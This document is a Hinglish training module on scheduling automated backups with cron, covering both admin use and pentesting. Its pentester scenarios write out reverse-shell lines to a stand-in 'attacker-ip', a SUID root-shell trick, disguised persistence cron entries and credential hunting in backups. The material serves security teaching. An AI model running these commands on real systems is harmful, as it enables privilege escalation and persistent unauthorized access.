# **Module 10: Backup & Restore Strategies (Part 2)** ğŸ’¾ğŸ”„

---

## **Topic 2: Automated Backups with Cron** â°ğŸ¤–

---

### **1ï¸âƒ£ Topic Summary (1-2 lines)**

Cron Linux ka built-in task scheduler hai jo automated backups schedule karne ke liye use hota hai - manual intervention ke bina regular intervals par backup scripts automatically execute karta hai.

---

### **2ï¸âƒ£ Detailed Explanation with Analogy** ğŸ§ 

**Kya hai Cron?**

Cron ek time-based job scheduler hai jo specific time ya intervals par commands/scripts automatically execute karta hai. Backup automation ke liye ye essential tool hai.

**Cron Components:**

1. **cron daemon (crond)** - Background service jo scheduled tasks run karta hai
2. **crontab** - User-specific cron configuration file
3. **Cron syntax** - Time specification format (minute hour day month weekday)
4. **Cron jobs** - Scheduled tasks/commands

**Analogy:**

Cron ek **alarm clock** ki tarah hai jo sirf alarm nahi bajata, balki aapke liye kaam bhi kar deta hai. Jaise aap alarm set karte ho "har subah 6 baje", waise hi cron ko bol sakte ho "har raat 2 baje backup script chala do". Aap so rahe ho, lekin aapka backup ho raha hai!

---

### **3ï¸âƒ£ Why is this Important?** ğŸ¯

**Sysadmin Perspective:**
- Manual backups unreliable hain (bhool sakte hain)
- Automated backups ensure consistency
- Off-hours mein backup (server load kam)
- Multiple backup schedules (daily/weekly/monthly)
- Disaster recovery readiness
- Compliance requirements meet karna

**Pentester Perspective:**
- Cron jobs mein writable scripts = privilege escalation
- Backup scripts mein credentials hardcoded
- Cron timing se backup location predict karna
- Backup files access karna during creation
- Persistence mechanism (malicious cron jobs)
- Scheduled tasks enumeration for attack surface

---

### **4ï¸âƒ£ Real-World Use Cases** ğŸ’¼

**Admin Use Cases:**
1. Daily database backups at 2 AM
2. Weekly full system backup on Sundays
3. Hourly log rotation and archiving
4. Monthly offsite backup sync
5. Real-time config file versioning

**Pentester Use Cases:**
1. Writable cron scripts exploit karna
2. Backup scripts se credentials extract karna
3. Cron jobs mein malicious commands inject karna
4. Backup timing observe karke data intercept karna
5. Persistence via malicious cron jobs

---

### **5ï¸âƒ£ Consequences of Not Knowing** âš ï¸

**Admin Problems:**
- âŒ Manual backups miss ho sakte hain
- âŒ Inconsistent backup schedules
- âŒ Human error increase
- âŒ Recovery time increase
- âŒ Compliance violations

**Pentester Problems:**
- âŒ Easy privilege escalation miss karna
- âŒ Persistence opportunities overlook karna
- âŒ Scheduled task enumeration incomplete
- âŒ Credential discovery incomplete
- âŒ Attack surface analysis weak

---

### **6ï¸âƒ£ Syntax & Command Structure** ğŸ“

#### **Crontab Syntax:**
```bash
* * * * * command_to_execute
â”‚ â”‚ â”‚ â”‚ â”‚
â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€ Day of week (0-7, 0 & 7 = Sunday)
â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€ Month (1-12)
â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€ Day of month (1-31)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Hour (0-23)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0-59)
```

#### **Crontab Commands:**
```bash
crontab -e    # Edit current user's crontab
crontab -l    # List current user's cron jobs
crontab -r    # Remove current user's crontab
crontab -u user -e    # Edit specific user's crontab (root only)
```

#### **Special Cron Strings:**
```bash
@reboot       # Run at system startup
@daily        # Run once a day (midnight)
@weekly       # Run once a week (Sunday midnight)
@monthly      # Run once a month (1st midnight)
@yearly       # Run once a year (Jan 1 midnight)
@hourly       # Run once an hour
```

---

### **7ï¸âƒ£ Detailed Examples with Explanation Tables** ğŸ’»

#### **Example 1: Daily Database Backup at 2 AM**

```bash
0 2 * * * /usr/local/bin/backup_database.sh
```

| Part | Explanation |
|------|-------------|
| `0` | Minute = 0 (exactly at the hour) |
| `2` | Hour = 2 (2 AM) |
| `*` | Every day of month |
| `*` | Every month |
| `*` | Every day of week |
| `/usr/local/bin/backup_database.sh` | Script to execute |

**Meaning:** Har din raat 2:00 AM par database backup script run hoga.

---

#### **Example 2: Hourly Website Backup**

```bash
0 * * * * tar -czf /backups/website_$(date +\%Y\%m\%d_\%H).tar.gz /var/www/html/
```

| Part | Explanation |
|------|-------------|
| `0` | Minute = 0 (top of hour) |
| `*` | Every hour |
| `*` | Every day |
| `*` | Every month |
| `*` | Every weekday |
| `tar -czf` | Create compressed archive |
| `$(date +\%Y\%m\%d_\%H)` | Timestamp in filename |
| `/var/www/html/` | Source directory |

**Output filename:** `website_20240115_14.tar.gz`

---

#### **Example 3: Weekly Full Backup on Sunday**

```bash
0 3 * * 0 /root/scripts/full_backup.sh
```

| Part | Explanation |
|------|-------------|
| `0` | Minute = 0 |
| `3` | Hour = 3 (3 AM) |
| `*` | Any day of month |
| `*` | Any month |
| `0` | Sunday (0 = Sunday) |
| `/root/scripts/full_backup.sh` | Backup script |

**Meaning:** Har Sunday subah 3:00 AM par full backup.

---

#### **Example 4: Every 15 Minutes Incremental Backup**

```bash
*/15 * * * * rsync -avz /data/ /backup/data/
```

| Part | Explanation |
|------|-------------|
| `*/15` | Every 15 minutes (0,15,30,45) |
| `*` | Every hour |
| `*` | Every day |
| `*` | Every month |
| `*` | Every weekday |
| `rsync -avz` | Incremental sync |

**Runs at:** 00:00, 00:15, 00:30, 00:45, 01:00, 01:15...

---

#### **Example 5: Monthly Backup on 1st at Midnight**

```bash
@monthly tar -czf /backups/monthly_$(date +\%Y\%m).tar.gz /home/
```

| Part | Explanation |
|------|-------------|
| `@monthly` | Special string = `0 0 1 * *` |
| `$(date +\%Y\%m)` | Year-Month format (202401) |
| `/home/` | All user home directories |

**Runs:** Har mahine ki pehli tareek ko midnight.

---

#### **Example 6: Backup Script with Logging**

```bash
0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
```

| Part | Explanation |
|------|-------------|
| `0 2 * * *` | Daily at 2 AM |
| `/usr/local/bin/backup.sh` | Backup script |
| `>>` | Append output |
| `/var/log/backup.log` | Log file |
| `2>&1` | Redirect errors to log |

**Result:** Script output aur errors dono log file mein save honge.

---

#### **Example 7: Backup with Email Notification**

```bash
0 3 * * * /root/backup.sh && echo "Backup successful" | mail -s "Backup Status" admin@example.com
```

| Part | Explanation |
|------|-------------|
| `0 3 * * *` | Daily at 3 AM |
| `/root/backup.sh` | Backup script |
| `&&` | Execute next if successful |
| `echo "..."` | Success message |
| `mail -s` | Send email with subject |

---

#### **Example 8: Conditional Backup (Only if Directory Exists)**

```bash
0 4 * * * [ -d /data ] && tar -czf /backup/data_$(date +\%Y\%m\%d).tar.gz /data/
```

| Part | Explanation |
|------|-------------|
| `[ -d /data ]` | Check if directory exists |
| `&&` | Execute backup only if true |
| `$(date +\%Y\%m\%d)` | Date in filename |

---

#### **Example 9: Backup with Retention (Delete Old Backups)**

```bash
0 2 * * * /usr/local/bin/backup.sh && find /backups/ -name "*.tar.gz" -mtime +30 -delete
```

| Part | Explanation |
|------|-------------|
| `/usr/local/bin/backup.sh` | Create new backup |
| `&&` | Then cleanup old backups |
| `find /backups/` | Search in backup directory |
| `-mtime +30` | Files older than 30 days |
| `-delete` | Delete matched files |

**Result:** Naya backup banao, phir 30 din se purane backups delete karo.

---

#### **Example 10: Pentester - Enumerate Cron Jobs**

```bash
# List current user's cron jobs
crontab -l

# Check system-wide cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Find writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
```

---

### **8ï¸âƒ£ Common Mistakes & How to Avoid** âŒâ¡ï¸âœ…

| Mistake | Problem | Solution |
|---------|---------|----------|
| `* * * * * command` | Runs every minute | Use proper time specification |
| No absolute paths | Cron has limited PATH | Always use full paths `/usr/bin/tar` |
| No error handling | Silent failures | Add logging `>> /var/log/cron.log 2>&1` |
| Overlapping jobs | Multiple backups running | Use locking mechanism |
| No retention policy | Disk full | Add cleanup: `find -mtime +30 -delete` |
| World-writable scripts | Security risk | `chmod 700 script.sh` |
| Hardcoded passwords | Credential exposure | Use environment variables |
| No backup verification | Corrupt backups | Add verification step |

---

### **9ï¸âƒ£ Best Practices & Pro Tips** â­

**Admin Best Practices:**
1. âœ… **Use Absolute Paths**: `/usr/bin/tar` not just `tar`
2. âœ… **Add Logging**: Always redirect output to log files
3. âœ… **Email Notifications**: Setup MAILTO in crontab
4. âœ… **Test Scripts Manually**: Before adding to cron
5. âœ… **Use Locking**: Prevent overlapping jobs (flock)
6. âœ… **Retention Policy**: Auto-delete old backups
7. âœ… **Monitor Cron**: Check logs regularly
8. âœ… **Secure Scripts**: chmod 700, owned by root

**Pentester Pro Tips:**
1. ğŸ” **Check All Cron Locations**: /etc/crontab, /etc/cron.d/, /var/spool/cron/
2. ğŸ” **Find Writable Scripts**: `find /etc/cron* -writable`
3. ğŸ” **Analyze Backup Scripts**: Look for credentials
4. ğŸ” **Timing Analysis**: Predict when backups run
5. ğŸ” **PATH Hijacking**: If script uses relative paths
6. ğŸ” **Wildcard Injection**: Exploit tar wildcards in cron
7. ğŸ” **Persistence**: Add malicious cron job
8. ğŸ” **Privilege Escalation**: Writable root cron scripts

---

### **ğŸ”Ÿ Real-World Scenarios** ğŸŒ

#### **Scenario 1: Complete Backup Solution (Admin)**

**Situation:** Production server ke liye comprehensive backup strategy implement karna hai.

**Solution:**
```bash
# Edit crontab
crontab -e

# Add multiple backup schedules:

# Hourly incremental backup
0 * * * * rsync -avz /var/www/ /backup/hourly/ >> /var/log/backup.log 2>&1

# Daily database backup at 2 AM
0 2 * * * mysqldump --all-databases | gzip > /backup/daily/db_$(date +\%Y\%m\%d).sql.gz

# Weekly full backup on Sunday at 3 AM
0 3 * * 0 tar -czf /backup/weekly/full_$(date +\%Y\%m\%d).tar.gz /var/www/ /etc/ /home/

# Monthly cleanup (delete backups older than 90 days)
0 4 1 * * find /backup/ -type f -mtime +90 -delete

# Daily backup verification
30 2 * * * /usr/local/bin/verify_backup.sh && echo "Backup verified" | mail -s "Backup OK" admin@example.com
```

**Result:** Multi-tier backup strategy with automatic cleanup aur verification.

---

#### **Scenario 2: Backup Script with Error Handling**

**Create script:** `/usr/local/bin/smart_backup.sh`

```bash
#!/bin/bash

# Configuration
BACKUP_DIR="/backups"
SOURCE_DIR="/var/www/html"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="website_${DATE}.tar.gz"
LOG_FILE="/var/log/backup.log"
MAX_AGE=30  # Days to keep backups

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Check if source exists
if [ ! -d "$SOURCE_DIR" ]; then
    log_message "ERROR: Source directory $SOURCE_DIR not found"
    exit 1
fi

# Create backup directory if not exists
mkdir -p "$BACKUP_DIR"

# Create backup
log_message "Starting backup of $SOURCE_DIR"
if tar -czf "${BACKUP_DIR}/${BACKUP_FILE}" "$SOURCE_DIR" 2>> "$LOG_FILE"; then
    log_message "SUCCESS: Backup created - ${BACKUP_FILE}"
    
    # Verify backup
    if tar -tzf "${BACKUP_DIR}/${BACKUP_FILE}" > /dev/null 2>&1; then
        log_message "SUCCESS: Backup verified"
    else
        log_message "ERROR: Backup verification failed"
        exit 1
    fi
else
    log_message "ERROR: Backup creation failed"
    exit 1
fi

# Cleanup old backups
log_message "Cleaning up backups older than $MAX_AGE days"
find "$BACKUP_DIR" -name "website_*.tar.gz" -mtime +$MAX_AGE -delete
log_message "Cleanup completed"

# Calculate backup size
BACKUP_SIZE=$(du -h "${BACKUP_DIR}/${BACKUP_FILE}" | cut -f1)
log_message "Backup size: $BACKUP_SIZE"

exit 0
```

**Make executable:**
```bash
chmod 700 /usr/local/bin/smart_backup.sh
chown root:root /usr/local/bin/smart_backup.sh
```

**Add to crontab:**
```bash
0 2 * * * /usr/local/bin/smart_backup.sh
```

---

#### **Scenario 3: Privilege Escalation via Writable Cron Script (Pentester)**

**Situation:** Low-privilege user ne writable cron script discover kiya.

**Enumeration:**
```bash
# Find writable cron scripts
find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null

# Output:
# /etc/cron.daily/backup.sh (writable by www-data group)
```

**Check script:**
```bash
cat /etc/cron.daily/backup.sh
```

**Output:**
```bash
#!/bin/bash
tar -czf /backup/daily.tar.gz /var/www/
```

**Exploit:**
```bash
# Add reverse shell to script
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /etc/cron.daily/backup.sh

# Or add SUID binary creation
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /etc/cron.daily/backup.sh
```

**Wait for cron to execute (daily scripts run at midnight):**
```bash
# Next day check
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1234567 Jan 15 00:05 /tmp/rootbash

# Get root shell
/tmp/rootbash -p
```

**Impact:** Low-privilege user se root access!

---

#### **Scenario 4: Backup Timing Exploitation (Pentester)**

**Situation:** Cron jobs analyze karke backup timing predict karna.

**Recon:**
```bash
# Check crontab
cat /etc/crontab
# Output: 0 2 * * * root /usr/local/bin/backup.sh

# Analyze backup script
cat /usr/local/bin/backup.sh
# Output: tar -czf /tmp/backup.tar.gz /var/www/
```

**Attack:**
```bash
# Wait for 2 AM (backup time)
# Monitor /tmp directory
watch -n 1 'ls -lh /tmp/backup.tar.gz'

# When backup starts creating, quickly copy it
# (before it's moved to secure location)
cp /tmp/backup.tar.gz /tmp/.hidden_backup.tar.gz

# Extract and analyze
tar -xzf /tmp/.hidden_backup.tar.gz
grep -r "password" var/www/
```

**Finding:** Database credentials in config files!

---

#### **Scenario 5: Persistence via Cron (Pentester)**

**Situation:** Root access mila, persistence establish karna hai.

**Method 1: User Crontab**
```bash
# Add reverse shell to user crontab
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'") | crontab -
```

**Method 2: System Cron**
```bash
# Add to /etc/cron.d/
echo "*/15 * * * * root /tmp/.hidden/backdoor.sh" > /etc/cron.d/system-update
chmod 644 /etc/cron.d/system-update
```

**Method 3: Cron Script Modification**
```bash
# Inject into existing cron script
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &' >> /etc/cron.daily/logrotate
```

**Result:** Har 10-15 minutes mein reverse shell connection!

---

### **1ï¸âƒ£1ï¸âƒ£ Checklist for Implementation** âœ…

**Admin Checklist:**
- [ ] Backup schedule defined (hourly/daily/weekly)
- [ ] Backup scripts created with error handling
- [ ] Absolute paths used in scripts
- [ ] Logging configured
- [ ] Email notifications setup
- [ ] Retention policy implemented
- [ ] Backup verification added
- [ ] Scripts secured (chmod 700, root owned)
- [ ] Cron jobs tested manually
- [ ] Monitoring setup for cron failures

**Pentester Checklist:**
- [ ] All cron locations enumerated
- [ ] User crontabs checked
- [ ] System cron files analyzed
- [ ] Writable cron scripts identified
- [ ] Backup scripts analyzed for credentials
- [ ] Cron timing documented
- [ ] PATH hijacking opportunities checked
- [ ] Wildcard injection possibilities assessed
- [ ] Persistence via cron tested
- [ ] Findings documented with PoC

---

### **1ï¸âƒ£2ï¸âƒ£ Frequently Asked Questions (FAQs)** â“

**Q1: Cron job run nahi ho raha, kaise debug karein?**
**A:** 
```bash
# Check cron service
systemctl status cron

# Check cron logs
grep CRON /var/log/syslog

# Test script manually
/usr/local/bin/backup.sh

# Check permissions
ls -la /usr/local/bin/backup.sh
```

**Q2: Cron mein environment variables kaise set karein?**
**A:**
```bash
# In crontab
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=admin@example.com

0 2 * * * /usr/local/bin/backup.sh
```

**Q3: Multiple cron jobs overlap ho rahe hain, kaise prevent karein?**
**A:** Use flock for locking:
```bash
0 * * * * flock -n /tmp/backup.lock /usr/local/bin/backup.sh
```

**Q4: Cron job output email mein aa raha hai, kaise stop karein?**
**A:**
```bash
# Method 1: Redirect to /dev/null
0 2 * * * /usr/local/bin/backup.sh > /dev/null 2>&1

# Method 2: Set MAILTO to empty
MAILTO=""
0 2 * * * /usr/local/bin/backup.sh
```

**Q5: Cron syntax test kaise karein?**
**A:** Use online tools like crontab.guru or:
```bash
# Install cron-utils
pip install cron-descriptor

# Test syntax
cron-descriptor "0 2 * * *"
# Output: "At 02:00 AM"
```

**Q6: Root cron jobs kaise check karein?**
**A:**
```bash
sudo crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
```

**Q7: Cron job specific time zone mein run karna hai?**
**A:**
```bash
# Set timezone in crontab
TZ=America/New_York
0 2 * * * /usr/local/bin/backup.sh
```

---

### **1ï¸âƒ£3ï¸âƒ£ Practice Tasks with Expected Output** ğŸ¯

#### **Task 1: Create Simple Backup Cron Job**
```bash
# Create test directory
mkdir -p ~/test_backup
echo "Test data" > ~/test_backup/file.txt

# Add cron job (runs every minute for testing)
crontab -e
# Add: * * * * * tar -czf ~/backup_$(date +\%Y\%m\%d_\%H\%M).tar.gz ~/test_backup/

# Wait 2 minutes, then check
ls -lh ~/backup_*
```

**Expected Output:**
```
-rw-rw-r-- 1 user user 245 Jan 15 10:01 backup_20240115_1001.tar.gz
-rw-rw-r-- 1 user user 245 Jan 15 10:02 backup_20240115_1002.tar.gz
```

---

#### **Task 2: Create Backup Script with Logging**
```bash
# Create script
cat > ~/backup_script.sh << 'EOF'
#!/bin/bash
echo "[$(date)] Backup started" >> ~/backup.log
tar -czf ~/backup.tar.gz ~/test_backup/ 2>> ~/backup.log
echo "[$(date)] Backup completed" >> ~/backup.log
EOF

chmod +x ~/backup_script.sh

# Add to cron (every 5 minutes)
crontab -e
# Add: */5 * * * * ~/backup_script.sh

# Check logs after 5 minutes
cat ~/backup.log
```

**Expected Output:**
```
[Mon Jan 15 10:05:00 UTC 2024] Backup started
[Mon Jan 15 10:05:01 UTC 2024] Backup completed
```

---

#### **Task 3: Enumerate Cron Jobs (Pentester)**
```bash
# Check all cron locations
echo "=== User Crontab ==="
crontab -l 2>/dev/null

echo "=== System Crontab ==="
cat /etc/crontab 2>/dev/null

echo "=== Cron.d ==="
ls -la /etc/cron.d/ 2>/dev/null

echo "=== Daily Cron Scripts ==="
ls -la /etc/cron.daily/ 2>/dev/null

echo "=== Writable Cron Files ==="
find /etc/cron* -type f -writable 2>/dev/null
```

---

#### **Task 4: Backup with Retention**
```bash
# Create script with cleanup
cat > ~/backup_with_retention.sh << 'EOF'
#!/bin/bash
BACKUP_DIR=~/backups
mkdir -p $BACKUP_DIR
tar -czf $BACKUP_DIR/backup_$(date +\%Y\%m\%d).tar.gz ~/test_backup/
find $BACKUP_DIR -name "backup_*.tar.gz" -mtime +7 -delete
EOF

chmod +x ~/backup_with_retention.sh

# Test manually
~/backup_with_retention.sh
ls -lh ~/backups/
```

---

### **1ï¸âƒ£4ï¸âƒ£ Advanced Information & Edge Cases** ğŸš€

#### **Advanced Technique 1: Cron with Locking**

```bash
#!/bin/bash
LOCKFILE=/tmp/backup.lock

# Try to acquire lock
exec 200>$LOCKFILE
flock -n 200 || exit 1

# Backup code here
tar -czf /backup/data.tar.gz /data/

# Lock automatically released when script exits
```

**Why:** Prevents multiple instances running simultaneously.

---

#### **Advanced Technique 2: Cron with Success/Failure Notifications**

```bash
#!/bin/bash
BACKUP_FILE="/backup/data_$(date +%Y%m%d).tar.gz"

if tar -czf "$BACKUP_FILE" /data/; then
    echo "Backup successful: $BACKUP_FILE" | mail -s "âœ… Backup OK" admin@example.com
else
    echo "Backup failed!" | mail -s "âŒ Backup FAILED" admin@example.com
    exit 1
fi
```

---

#### **Advanced Technique 3: Parallel Backups**

```bash
# Crontab entry
0 2 * * * /usr/local/bin/parallel_backup.sh

# Script content
#!/bin/bash
tar -czf /backup/www.tar.gz /var/www/ &
tar -czf /backup/etc.tar.gz /etc/ &
tar -czf /backup/home.tar.gz /home/ &
wait  # Wait for all background jobs to complete
```

---

#### **Edge Case 1: Cron with Special Characters**

```bash
# Escape % in crontab
0 2 * * * tar -czf /backup/data_$(date +\%Y\%m\%d).tar.gz /data/

# Or use script
0 2 * * * /usr/local/bin/backup.sh
```

---

#### **Edge Case 2: Cron PATH Issues**

```bash
# Wrong (may fail)
0 2 * * * backup.sh

# Right (absolute path)
0 2 * * * /usr/local/bin/backup.sh

# Or set PATH in crontab
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 2 * * * backup.sh
```

---

### **1ï¸âƒ£5ï¸âƒ£ Final Summary & Key Takeaways** ğŸ“Œ

**Key Concepts:**
1. **Cron** - Time-based job scheduler for automation
2. **Crontab Syntax** - `minute hour day month weekday command`
3. **Special Strings** - @daily, @weekly, @monthly, @reboot
4. **Logging** - Always redirect output for debugging
5. **Security** - Secure scripts, check permissions

**Critical Commands:**
```bash
# Edit crontab
crontab -e

# List cron jobs
crontab -l

# Cron syntax
0 2 * * * /path/to/script.sh >> /var/log/backup.log 2>&1
```

**Admin Takeaways:**
- âœ… Automate all regular backups with cron
- âœ… Use absolute paths in cron jobs
- âœ… Add logging and error handling
- âœ… Implement retention policies
- âœ… Test scripts manually before scheduling
- âœ… Monitor cron job execution
- âœ… Secure backup scripts (chmod 700)

**Pentester Takeaways:**
- ğŸ” Enumerate all cron locations
- ğŸ” Check for writable cron scripts
- ğŸ” Analyze backup scripts for credentials
- ğŸ” Exploit cron for privilege escalation
- ğŸ” Use cron for persistence
- ğŸ” Monitor backup timing for data access
- ğŸ” PATH hijacking in cron jobs

**Remember:**
- Cron = automation = consistency
- Always log cron job output
- Test before scheduling
- Secure your cron scripts
- Monitor for failures

**Next Topic:** Disaster Recovery & System Restore ğŸ”„

---

**Happy Automating! â°ğŸ¤–**
